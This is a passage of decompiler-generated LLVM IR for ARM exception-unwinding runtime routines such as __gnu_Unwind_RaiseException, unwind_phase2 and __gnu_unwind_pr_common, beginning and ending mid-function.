  %v1_17d4c = load i32, i32* @r4, align 4
  %v9_17d4c = icmp eq i32 %v0_17d4c, %v1_17d4c
  store i32 %v2_17d48, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_17d4c, label %dec_label_pc_17d60, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_17d6c

dec_label_pc_17d60:                               ; preds = %entry
  store i32 %v0_17d4c, i32* @r4, align 4
  br label %dec_label_pc_17d68

dec_label_pc_17d68:                               ; preds = %dec_label_pc_17e30, %dec_label_pc_17d60
  br label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %.thread, %dec_label_pc_17d68
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_17d68 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_17d6c = icmp eq i32 %v2_17d48, 0
  br i1 %v2_17d6c, label %dec_label_pc_17de4, label %.thread2.dec_label_pc_17d80_crit_edge

.thread2.dec_label_pc_17d80_crit_edge:            ; preds = %dec_label_pc_17d6c
  br label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %.thread2.dec_label_pc_17d80_crit_edge, %dec_label_pc_17de4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_17d90 = load i32, i32* @r5, align 4
  store i32 %v0_17d90, i32* @r3, align 4
  store i32 97696, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_17d30)
  br i1 false, label %dec_label_pc_17da8, label %dec_label_pc_17dd0

dec_label_pc_17da8:                               ; preds = %dec_label_pc_17d80
  br i1 undef, label %dec_label_pc_17db0, label %dec_label_pc_17dd4

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17da8
  br i1 undef, label %dec_label_pc_17e30, label %dec_label_pc_17dc8

dec_label_pc_17dc8:                               ; preds = %dec_label_pc_17db0
  br i1 undef, label %dec_label_pc_17e28, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17d80, %dec_label_pc_17dc8
  br label %dec_label_pc_17dd4

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17da8, %dec_label_pc_17dd0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_17de4:                               ; preds = %dec_label_pc_17d6c
  store i32 %v11_17d28, i32* @r3, align 4
  %v2_17de8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_17de8, i32* @r4, align 4
  %v1_17dec = load i32, i32* @r5, align 4
  %v2_17dec = add i32 %v1_17dec, 20
  %v3_17dec = inttoptr i32 %v2_17dec to i32*
  store i32 %v11_17d28, i32* %v3_17dec, align 4
  store i32 %v2_17de8, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_17dfc = call i32 @memcpy()
  %v0_17e04 = load i32, i32* @r6, align 4
  store i32 %v0_17e04, i32* %r0.global-to-local, align 4
  %v0_17e08 = load i32, i32* @r5, align 4
  %v1_17e0c = add i32 %v0_17e08, 16
  %v2_17e0c = inttoptr i32 %v1_17e0c to i32*
  %v3_17e0c = load i32, i32* %v2_17e0c, align 4
  store i32 %v3_17e0c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_17e0c)
  %v0_17e1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17e1c, i32* @r4, align 4
  br label %dec_label_pc_17d80

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17dc8
  br label %dec_label_pc_17e30

dec_label_pc_17e30:                               ; preds = %dec_label_pc_17db0, %dec_label_pc_17e28
  br label %dec_label_pc_17d68

; uselistorder directives
  uselistorder i32 %v11_17d28, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 41, 42, 30, 109, 110, 33, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 31, 32, 34, 35, 36, 37, 38, 39, 40, 82, 65, 66, 67, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 44, 45, 143, 144, 57, 58, 104, 105, 106, 98, 97, 99, 100, 102, 101, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 43, 68, 46, 47, 48, 49, 50, 51, 151, 152, 153, 154, 59, 60, 61, 88, 89, 90, 91, 69, 70, 71, 8, 92, 93, 94, 95, 96, 24, 25, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 26, 27, 28, 29, 52, 53, 54, 103, 55, 56, 62, 63, 64, 72, 7, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 34, 10, 26, 28, 11, 27, 12, 29, 13, 30, 23, 6, 35, 24, 14, 3, 25, 36, 15, 37, 38, 16, 17, 18, 41, 9, 46, 47, 48, 49, 50, 51, 52, 19, 53, 54, 55, 20, 56, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 21, 73, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_17e30, { 1, 0 }
  uselistorder label %dec_label_pc_17dd4, { 1, 0 }
  uselistorder label %dec_label_pc_17dd0, { 1, 0 }
  uselistorder label %dec_label_pc_17d80, { 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_17e44 = add i32 %ucbp, 12
  %v3_17e44 = inttoptr i32 %v2_17e44 to i32*
  store i32 %stop_fn, i32* %v3_17e44, align 4
  %v3_17e48 = add i32 %ucbp, 24
  %v4_17e48 = inttoptr i32 %v3_17e48 to i32*
  store i32 %tmp, i32* %v4_17e48, align 4
  %v1_17e4c = add i32 %entry_vrs, 60
  %v2_17e4c = inttoptr i32 %v1_17e4c to i32*
  %v3_17e4c = load i32, i32* %v2_17e4c, align 4
  %v2_17e54 = add i32 %entry_vrs, 64
  %v3_17e54 = inttoptr i32 %v2_17e54 to i32*
  store i32 %v3_17e4c, i32* %v3_17e54, align 4
  %v3_17e5c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_17e5c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_17e746 = add i32 %vrs, 64
  %v2_17e747 = inttoptr i32 %v1_17e746 to i32*
  %v3_17e748 = load i32, i32* %v2_17e747, align 4
  %v2_17e789 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_17e748)
  store i32 %v2_17e789, i32* %r0.global-to-local, align 4
  %v2_17e7c11 = icmp eq i32 %v2_17e789, 0
  br i1 %v2_17e7c11, label %dec_label_pc_17e84, label %dec_label_pc_17eb4

dec_label_pc_17e84:                               ; preds = %entry, %dec_label_pc_17e84.dec_label_pc_17e70_crit_edge
  %v0_17e84 = load i32, i32* @r5, align 4
  %v1_17e84 = add i32 %v0_17e84, 64
  %v2_17e84 = inttoptr i32 %v1_17e84 to i32*
  %v3_17e84 = load i32, i32* %v2_17e84, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_17e8c = load i32, i32* @r4, align 4
  %v2_17e8c = add i32 %v1_17e8c, 20
  %v3_17e8c = inttoptr i32 %v2_17e8c to i32*
  store i32 %v3_17e84, i32* %v3_17e8c, align 4
  %v0_17e90 = load i32, i32* @r4, align 4
  %v1_17e98 = add i32 %v0_17e90, 16
  %v2_17e98 = inttoptr i32 %v1_17e98 to i32*
  %v3_17e98 = load i32, i32* %v2_17e98, align 4
  call void @__pseudo_branch(i32 %v3_17e98)
  %v0_17ea4 = load i32, i32* %r0.global-to-local, align 4
  %v7_17ea4 = icmp eq i32 %v0_17ea4, 8
  br i1 %v7_17ea4, label %dec_label_pc_17e84.dec_label_pc_17e70_crit_edge, label %dec_label_pc_17eac

dec_label_pc_17e84.dec_label_pc_17e70_crit_edge:  ; preds = %dec_label_pc_17e84
  %v0_17e70.pre = load i32, i32* @r4, align 4
  %v0_17e74.pre = load i32, i32* @r5, align 4
  store i32 %v0_17e70.pre, i32* %r0.global-to-local, align 4
  %v1_17e74 = add i32 %v0_17e74.pre, 64
  %v2_17e74 = inttoptr i32 %v1_17e74 to i32*
  %v3_17e74 = load i32, i32* %v2_17e74, align 4
  %v2_17e78 = call i32 @get_eit_entry(i32 %v0_17e70.pre, i32 %v3_17e74)
  store i32 %v2_17e78, i32* %r0.global-to-local, align 4
  %v2_17e7c = icmp eq i32 %v2_17e78, 0
  br i1 %v2_17e7c, label %dec_label_pc_17e84, label %dec_label_pc_17eb4

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17e84
  %v7_17eac = icmp eq i32 %v0_17ea4, 7
  br i1 %v7_17eac, label %dec_label_pc_17eb8, label %dec_label_pc_17eb4

dec_label_pc_17eb4:                               ; preds = %entry, %dec_label_pc_17e84.dec_label_pc_17e70_crit_edge, %dec_label_pc_17eac
  %v0_17eb4 = call i32 @abort()
  store i32 %v0_17eb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17eb8

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17eac, %dec_label_pc_17eb4
  %v0_17eb8 = load i32, i32* @r5, align 4
  %v1_17eb8 = add i32 %v0_17eb8, 4
  store i32 %v1_17eb8, i32* %r0.global-to-local, align 4
  %v1_17ebc = inttoptr i32 %v1_17eb8 to i32*
  %v2_17ebc = call i32 @__restore_core_regs(i32* %v1_17ebc)
  store i32 %v2_17ebc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 1, 2, 0 }
  uselistorder label %dec_label_pc_17eb8, { 1, 0 }
  uselistorder label %dec_label_pc_17eb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e84, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_17ec0 = add i32 %ucbp, 20
  %v2_17ec0 = inttoptr i32 %v1_17ec0 to i32*
  %v3_17ec0 = load i32, i32* %v2_17ec0, align 4
  %v1_17ec8 = load i32, i32* %r1.global-to-local, align 4
  %v2_17ec8 = add i32 %v1_17ec8, 64
  %v3_17ec8 = inttoptr i32 %v2_17ec8 to i32*
  store i32 %v3_17ec0, i32* %v3_17ec8, align 4
  %v1_17ecc = add i32 %ucbp, 12
  %v2_17ecc = inttoptr i32 %v1_17ecc to i32*
  %v3_17ecc = load i32, i32* %v2_17ecc, align 4
  %v2_17ed0 = icmp eq i32 %v3_17ecc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_17edc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17edc, i32* @r5, align 4
  br i1 %v2_17ed0, label %dec_label_pc_17ee4, label %dec_label_pc_17f20

dec_label_pc_17ee4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_17ef0 = add i32 %ucbp, 16
  %v2_17ef0 = inttoptr i32 %v1_17ef0 to i32*
  %v3_17ef0 = load i32, i32* %v2_17ef0, align 4
  call void @__pseudo_branch(i32 %v3_17ef0)
  br i1 false, label %dec_label_pc_17f18, label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ee4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_12cd0.539 to i32))
  %v0_17f0c = load i32, i32* @r4, align 4
  %v0_17f10 = load i32, i32* @r5, align 4
  store i32 %v0_17f10, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_17f0c, i32 %v0_17f10)
  br label %dec_label_pc_17f18

dec_label_pc_17f18:                               ; preds = %dec_label_pc_17ee4, %dec_label_pc_17f04
  %v0_17f18 = load i32, i32* @r5, align 4
  %v1_17f18 = add i32 %v0_17f18, 4
  %v1_17f1c = inttoptr i32 %v1_17f18 to i32*
  %v2_17f1c = call i32 @__restore_core_regs(i32* %v1_17f1c)
  %v1_17f24.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %entry, %dec_label_pc_17f18
  %v1_17f24 = phi i32 [ %v0_17edc, %entry ], [ %v1_17f24.pre, %dec_label_pc_17f18 ]
  %v3_17f24 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_17f24, i32 1)
  %v0_17f28 = call i32 @abort()
  ret i32 %v0_17f28

; uselistorder directives
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 46, 48, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 53, 57, 56, 55, 49, 50, 37, 38, 39, 40, 41, 51, 52, 54, 32, 33, 47, 30, 34, 31, 23, 24, 0, 25, 26, 27, 28, 35, 36, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 134, 4, 135, 136, 137, 138, 5, 80, 111, 139, 6, 79, 140, 7, 78, 141, 142, 143, 144, 8, 145, 112, 9, 82, 146, 10, 81, 147, 148, 11, 149, 150, 151, 12, 152, 153, 13, 154, 14, 114, 155, 156, 113, 157, 158, 15, 83, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 18, 85, 19, 169, 170, 171, 20, 84, 172, 21, 17, 173, 174, 22, 175, 176, 177, 23, 178, 179, 180, 181, 182, 24, 25, 115, 26, 27, 28, 133, 86, 183, 184, 87, 185, 117, 186, 187, 30, 188, 189, 31, 88, 191, 29, 192, 190, 193, 116, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 90, 43, 44, 45, 46, 47, 212, 77, 91, 97, 198, 100, 99, 48, 194, 120, 195, 196, 51, 197, 89, 98, 199, 200, 201, 202, 92, 203, 204, 205, 206, 207, 52, 53, 208, 209, 49, 50, 210, 211, 119, 118, 54, 55, 56, 213, 57, 58, 101, 102, 107, 103, 108, 104, 106, 214, 105, 110, 215, 59, 216, 60, 217, 121, 122, 218, 123, 124, 219, 125, 126, 61, 62, 220, 127, 128, 63, 64, 221, 129, 130, 65, 66, 222, 131, 132, 67, 68, 96, 223, 224, 109, 225, 69, 93, 70, 71, 94, 72, 73, 74, 75, 76 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_17f20, { 1, 0 }
  uselistorder label %dec_label_pc_17f18, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17f2c = load i32, i32* @r4, align 4
  store i32 %v3_17f2c, i32* %stack_var_-16, align 4
  %v6_17f2c = load i32, i32* @r5, align 4
  %v9_17f2c = load i32, i32* @r6, align 4
  %v12_17f2c = load i32, i32* @lr, align 4
  %v1_17f30 = add i32 %entry_vrs, 60
  %v2_17f30 = inttoptr i32 %v1_17f30 to i32*
  %v3_17f30 = load i32, i32* %v2_17f30, align 4
  %v2_17f34 = add i32 %entry_vrs, 64
  %v3_17f34 = inttoptr i32 %v2_17f34 to i32*
  store i32 %v3_17f30, i32* %v3_17f34, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17f64 = load i32, i32* %v3_17f34, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17f7c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17f64)
  %v2_17f80 = icmp eq i32 %v2_17f7c, 0
  br i1 %v2_17f80, label %dec_label_pc_17f88, label %dec_label_pc_17fbc

dec_label_pc_17f88:                               ; preds = %entry
  %v0_17f88 = load i32, i32* @r5, align 4
  %v1_17f90 = add i32 %v0_17f88, 16
  %v2_17f90 = inttoptr i32 %v1_17f90 to i32*
  %v3_17f90 = load i32, i32* %v2_17f90, align 4
  call void @__pseudo_branch(i32 %v3_17f90)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17fa8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_17fac = urem i32 %v2_17fa8, 2
  %v2_17fac = icmp eq i32 %v1_17fac, 0
  br i1 %v2_17fac, label %dec_label_pc_17fcc, label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17f88, %dec_label_pc_17fcc
  %v0_17fb4 = phi i1 [ false, %dec_label_pc_17f88 ], [ %phitmp, %dec_label_pc_17fcc ]
  br i1 %v0_17fb4, label %dec_label_pc_17fd8, label %dec_label_pc_17fbc

dec_label_pc_17fbc:                               ; preds = %entry, %dec_label_pc_17fb4
  %v2_17fc4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17fc4, i32* @r4, align 4
  store i32 %v6_17f2c, i32* @r5, align 4
  store i32 %v9_17f2c, i32* @r6, align 4
  store i32 %v12_17f2c, i32* @lr, align 4
  ret i32 9

dec_label_pc_17fcc:                               ; preds = %dec_label_pc_17f88
  %v2_17fcc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_17fcc, i32* @r0, align 4
  %v1_17fd0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_17fcc)
  %v0_17fb4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_17fb4.pre, 6
  br label %dec_label_pc_17fb4

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fb4
  %v0_17fd8 = load i32, i32* @r5, align 4
  %v0_17fdc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_17fd8, i32 %v0_17fdc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17fbc, { 1, 0 }
  uselistorder label %dec_label_pc_17fb4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_17fe4 = add i32 %ucbp, 12
  %v2_17fe4 = inttoptr i32 %v1_17fe4 to i32*
  %v3_17fe4 = load i32, i32* %v2_17fe4, align 4
  %v2_17fe8 = icmp eq i32 %v3_17fe4, 0
  br i1 %v2_17fe8, label %dec_label_pc_17ff0, label %dec_label_pc_17ff4

dec_label_pc_17ff0:                               ; preds = %entry
  %v2_17ff0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_17ff4

dec_label_pc_17ff4:                               ; preds = %entry, %dec_label_pc_17ff0
  %v1_17ff4 = add i32 %entry_vrs, 60
  %v2_17ff4 = inttoptr i32 %v1_17ff4 to i32*
  %v3_17ff4 = load i32, i32* %v2_17ff4, align 4
  %v2_17ffc = add i32 %entry_vrs, 64
  %v3_17ffc = inttoptr i32 %v2_17ffc to i32*
  store i32 %v3_17ff4, i32* %v3_17ffc, align 4
  %v3_18000 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18000

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17ff4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18060

bb:                                               ; preds = %entry
  %v7_18018 = mul i32 %regclass, 4
  %v8_18018 = add i32 %v7_18018, ptrtoint (i32* @global_var_18020.691 to i32)
  call void @__pseudo_branch(i32 %v8_18018)
  br label %dec_label_pc_18060

dec_label_pc_18060:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18148 = load i32, i32* @r4, align 4
  %v6_18148 = load i32, i32* @r5, align 4
  %v2_18158 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18160 = add i32 %ucbp, 76
  %v2_18160 = inttoptr i32 %v1_18160 to i32*
  %v3_18160 = load i32, i32* %v2_18160, align 4
  %v1_1816c = inttoptr i32 %v3_18160 to i32*
  %v2_1816c = load i32, i32* %v1_1816c, align 4
  store i32 %v2_1816c, i32* @lr, align 4
  %v4_1816c = add i32 %v3_18160, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18178 = urem i32 %state, 4
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  %v1_1817c = and i32 %state, 8
  store i32 %v1_1817c, i32* %r0.global-to-local, align 4
  %v4_1818c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1816c, i32* %v4_1818c, align 8
  br i1 %v2_18158, label %dec_label_pc_1819c, label %dec_label_pc_18478

dec_label_pc_1819c:                               ; preds = %entry
  %v3_1819c = mul i32 %v2_1816c, 256
  store i32 %v3_1819c, i32* %v4_1818c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_181b4

dec_label_pc_181b4:                               ; preds = %dec_label_pc_18478, %dec_label_pc_1819c
  %v0_181d8647090 = phi i32 [ %v2_18490, %dec_label_pc_18478 ], [ %v4_1816c, %dec_label_pc_1819c ]
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  %v1_181b8 = add i32 %ucbp, 80
  %v2_181b8 = inttoptr i32 %v1_181b8 to i32*
  %v3_181b8 = load i32, i32* %v2_181b8, align 4
  %v7_181bc = icmp eq i32 %v1_18178, 2
  br i1 %v7_181bc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_181b4
  %v2_181c0 = add i32 %ucbp, 56
  %v3_181c0 = inttoptr i32 %v2_181c0 to i32*
  %v4_181c0 = load i32, i32* %v3_181c0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_181b4, %bb
  %v0_181d86470 = phi i32 [ %v0_181d8647090, %dec_label_pc_181b4 ], [ %v4_181c0, %bb ]
  %v1_181c4 = urem i32 %v3_181b8, 2
  %v2_181c4 = icmp eq i32 %v1_181c4, 0
  br i1 %v2_181c4, label %dec_label_pc_181d8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18298

dec_label_pc_181d8.preheader:                     ; preds = %bb148
  %v1_181d86571 = inttoptr i32 %v0_181d86470 to i32*
  %v2_181d86672 = load i32, i32* %v1_181d86571, align 4
  %v2_181dc6874 = icmp eq i32 %v2_181d86672, 0
  br i1 %v2_181dc6874, label %dec_label_pc_18298, label %dec_label_pc_181e4.preheader.lr.ph.lr.ph

dec_label_pc_181e4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_181d8.preheader
  %v7_181e8 = icmp eq i32 %id, 2
  %v2_18274 = icmp eq i32 %v1_18178, 0
  %v2_18440 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1835c = icmp eq i32 %v1_1817c, 0
  br label %dec_label_pc_181e4.preheader.lr.ph

dec_label_pc_181e4.preheader.lr.ph:               ; preds = %dec_label_pc_181e4.preheader.lr.ph.lr.ph, %dec_label_pc_184ac
  %v1_181f496 = phi i32 [ %v2_181d86672, %dec_label_pc_181e4.preheader.lr.ph.lr.ph ], [ %v2_181d866, %dec_label_pc_184ac ]
  %v1_181f093 = phi i32 [ %v0_181d86470, %dec_label_pc_181e4.preheader.lr.ph.lr.ph ], [ %v2_184b0, %dec_label_pc_184ac ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_181e4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_184ac ]
  br label %dec_label_pc_181e4.preheader

dec_label_pc_181e4.preheader:                     ; preds = %dec_label_pc_181e4.preheader.lr.ph, %dec_label_pc_18470
  %v1_181f495 = phi i32 [ %v1_181f496, %dec_label_pc_181e4.preheader.lr.ph ], [ %v2_181d8, %dec_label_pc_18470 ]
  %v1_181f092 = phi i32 [ %v1_181f093, %dec_label_pc_181e4.preheader.lr.ph ], [ %v1_18470, %dec_label_pc_18470 ]
  br label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %dec_label_pc_181e4.preheader, %dec_label_pc_18288
  %v1_181f4 = phi i32 [ %v1_181f495, %dec_label_pc_181e4.preheader ], [ %v2_1828c, %dec_label_pc_18288 ]
  %v1_18208 = phi i32 [ %v1_181f092, %dec_label_pc_181e4.preheader ], [ %v1_18288, %dec_label_pc_18288 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_181e8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_181e4
  %v2_181ec = add i32 %v1_18208, 4
  %v3_181ec = inttoptr i32 %v2_181ec to i32*
  %v4_181ec = load i32, i32* %v3_181ec, align 4
  store i32 %v4_181ec, i32* @r5, align 4
  store i32 %v1_181f4, i32* @r6, align 4
  %v0_181f8109 = load i32, i32* @r8, align 4
  %v1_181f8110 = add i32 %v0_181f8109, 72
  %v2_181f8111 = inttoptr i32 %v1_181f8110 to i32*
  %v3_181f8112 = load i32, i32* %v2_181f8111, align 4
  store i32 %v3_181f8112, i32* @lr, align 4
  %v2_18204 = add i32 %v1_18208, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_181e4
  %v2_181f0 = add i32 %v1_18208, 2
  %v3_181f0 = inttoptr i32 %v2_181f0 to i16*
  %v4_181f0 = load i16, i16* %v3_181f0, align 2
  %v5_181f0 = zext i16 %v4_181f0 to i32
  store i32 %v5_181f0, i32* @r5, align 4
  %v0_181f8 = load i32, i32* @r8, align 4
  %v1_181f8 = add i32 %v0_181f8, 72
  %v2_181f8 = inttoptr i32 %v1_181f8 to i32*
  %v3_181f8 = load i32, i32* %v2_181f8, align 4
  store i32 %v3_181f8, i32* @lr, align 4
  %v2_18200 = inttoptr i32 %v1_18208 to i16*
  %v3_18200 = load i16, i16* %v2_18200, align 2
  %v4_18200 = zext i16 %v3_18200 to i32
  store i32 %v4_18200, i32* @r6, align 4
  %v2_18208 = add i32 %v1_18208, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18208, %.thread16 ], [ %v2_18204, %bb151 ]
  %v3_181f8115 = phi i32 [ %v3_181f8, %.thread16 ], [ %v3_181f8112, %bb151 ]
  %v0_18210113 = phi i32 [ %v5_181f0, %.thread16 ], [ %v4_181ec, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18210 = and i32 %v0_18210113, -2
  %v2_18214 = add i32 %v1_18210, %v3_181f8115
  store i32 %v2_18214, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18224 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18224, i32* %r0.global-to-local, align 4
  %v5_18230 = call i32 @_Unwind_VRS_Get(i32 %v0_18224, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18230, i32* %r0.global-to-local, align 4
  %v3_18234 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18234, i32* %r2.global-to-local, align 4
  %v0_18238 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18238, %v3_18234
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18244

._crit_edge:                                      ; preds = %bb152
  %v0_1825c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18244:                               ; preds = %bb152
  %v0_18244 = load i32, i32* @r6, align 4
  %v1_18244 = and i32 %v0_18244, -2
  %v2_18248 = add i32 %v1_18244, %v0_18238
  %v3_1824c = icmp ult i32 %v3_18234, %v2_18248
  br i1 %v3_1824c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18244
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18244
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
